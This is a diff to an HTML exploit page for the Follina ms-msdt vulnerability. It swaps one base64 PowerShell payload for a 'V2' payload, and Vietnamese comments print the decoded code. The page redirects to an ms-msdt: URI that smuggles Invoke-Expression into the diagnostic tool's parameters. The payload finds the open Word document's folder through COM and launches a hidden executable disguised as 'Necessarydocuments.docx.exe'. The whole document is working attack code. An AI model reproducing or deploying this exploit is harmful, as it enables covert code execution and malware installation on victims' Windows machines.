@@ -5,7 +5,9 @@
 </head>
 <body>
     <script>
-        var payload = "U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIiRlbnY6Q0RcTmVjZXNzYXJ5ZG9jdW1lbnRzLmRvY3guZXhlIiAtV2luZG93U3R5bGUgSGlkZGVu";
+        // Follina Payload V2 - Dùng COM Object bắt Word khai ra thư mục gốc
+        // Code gốc: $w = [System.Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application'); $p = $w.ActiveDocument.Path; Set-Location $p; Start-Process "Necessarydocuments.docx.exe" -WindowStyle Hidden
+        var payload = "JHcgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRBY3RpdmVPYmplY3QoJ1dvcmQuQXBwbGljYXRpb24nKTsgJHAgPSAkdy5BY3RpdmVEb2N1bWVudC5QYXRoOyBTZXQtTG9jYXRpb24gJHA7IFN0YXJ0LVByb2Nlc3MgIk5lY2Vzc2FyeWRvY3VtZW50cy5kb2N4LmV4ZSIgLVdpbmRvd1N0eWxlIEhpZGRlbg==";
         window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"' + payload + '\"))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
     </script>
 </body>
